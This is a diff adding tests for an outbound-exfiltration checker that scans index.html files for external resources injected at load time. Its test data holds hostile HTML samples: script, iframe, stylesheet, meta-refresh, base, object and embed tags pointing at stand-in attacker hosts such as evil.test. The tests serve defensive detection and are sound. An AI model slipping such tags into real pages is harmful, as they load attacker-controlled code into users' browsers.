@@ -795,6 +795,145 @@ def test_private_net_const_with_fetch_passes():
     assert check_outbound_exfil(content, "App.tsx") is None
 
 
+# --- QA-3 Fire 120: HTML external-resource injection -----------------------
+
+
+def test_fire120_exact_script_src_blocks():
+    """Fire 120 exact: `<script src="https://evil/x.js">` in index.html."""
+    content = (
+        '<!DOCTYPE html><html><head><title>CT</title>\n'
+        '<script src="https://example-attacker.test/qa3-html120.js"></script>\n'
+        '</head><body><div id="root"></div></body></html>\n'
+    )
+    err = check_outbound_exfil(content, "index.html")
+    assert err is not None
+    assert "example-attacker.test" in err
+    assert "<script src>" in err
+
+
+def test_iframe_external_src_blocks():
+    err = check_outbound_exfil(
+        '<iframe src="https://evil.test/"></iframe>', "index.html"
+    )
+    assert err is not None and "iframe" in err
+
+
+def test_link_stylesheet_external_blocks():
+    err = check_outbound_exfil(
+        '<link rel="stylesheet" href="https://evil.test/x.css">',
+        "index.html",
+    )
+    assert err is not None and "stylesheet" in err
+
+
+def test_link_manifest_external_blocks():
+    err = check_outbound_exfil(
+        '<link rel="manifest" href="https://evil.test/manifest.json">',
+        "index.html",
+    )
+    assert err is not None and "manifest" in err
+
+
+def test_link_preload_external_blocks():
+    err = check_outbound_exfil(
+        '<link rel="preload" href="https://evil.test/x.js" as="script">',
+        "index.html",
+    )
+    assert err is not None
+
+
+def test_meta_refresh_external_blocks():
+    err = check_outbound_exfil(
+        '<meta http-equiv="refresh" content="0;url=https://evil.test">',
+        "index.html",
+    )
+    assert err is not None and "meta" in err
+
+
+def test_base_href_external_blocks():
+    err = check_outbound_exfil(
+        '<base href="https://evil.test/">', "index.html"
+    )
+    assert err is not None and "base" in err
+
+
+def test_object_external_blocks():
+    err = check_outbound_exfil(
+        '<object data="https://evil.test/evil.swf"></object>',
+        "index.html",
+    )
+    assert err is not None
+
+
+def test_embed_external_blocks():
+    err = check_outbound_exfil(
+        '<embed src="https://evil.test/evil.swf">', "index.html"
+    )
+    assert err is not None
+
+
+def test_schemeless_script_src_blocks():
+    """`<script src="//evil/x.js">` schemeless form also blocks."""
+    err = check_outbound_exfil(
+        '<script src="//evil.test/x.js"></script>', "index.html"
+    )
+    assert err is not None
+
+
+def test_a_href_external_passes():
+    """Benign: `<a href="external">` is user-navigated, not load-time exec."""
+    assert check_outbound_exfil(
+        '<a href="https://docs.example.com">Docs</a>', "index.html"
+    ) is None
+
+
+def test_visible_img_external_still_passes_in_html():
+    """Visible external img (e.g. logo) — not blocked (hidden-pixel scan
+    only fires when display:none)."""
+    assert check_outbound_exfil(
+        '<img src="https://cdn.example.com/logo.png" alt="logo">',
+        "index.html",
+    ) is None
+
+
+def test_inline_script_passes():
+    """Inline `<script>...</script>` with no src is user-written code —
+    falls through to the JS-focused scans."""
+    assert check_outbound_exfil(
+        '<script>console.log("hello")</script>', "index.html"
+    ) is None
+
+
+def test_html_localhost_script_passes():
+    assert check_outbound_exfil(
+        '<script src="http://localhost:3000/dev.js"></script>',
+        "index.html",
+    ) is None
+    assert check_outbound_exfil(
+        '<link rel="stylesheet" href="http://localhost:3000/dev.css">',
+        "index.html",
+    ) is None
+
+
+def test_relative_urls_pass():
+    """Regression: relative `/assets/app.js` and `./style.css` must pass."""
+    assert check_outbound_exfil(
+        '<script src="/assets/app.js"></script>', "index.html"
+    ) is None
+    assert check_outbound_exfil(
+        '<link rel="stylesheet" href="./style.css">', "index.html"
+    ) is None
+
+
+def test_form_action_external_passes():
+    """`<form action="external">` is user-initiated, not load-time exec.
+    Not currently blocked (different risk profile)."""
+    assert check_outbound_exfil(
+        '<form action="https://api.example.com/submit"></form>',
+        "index.html",
+    ) is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
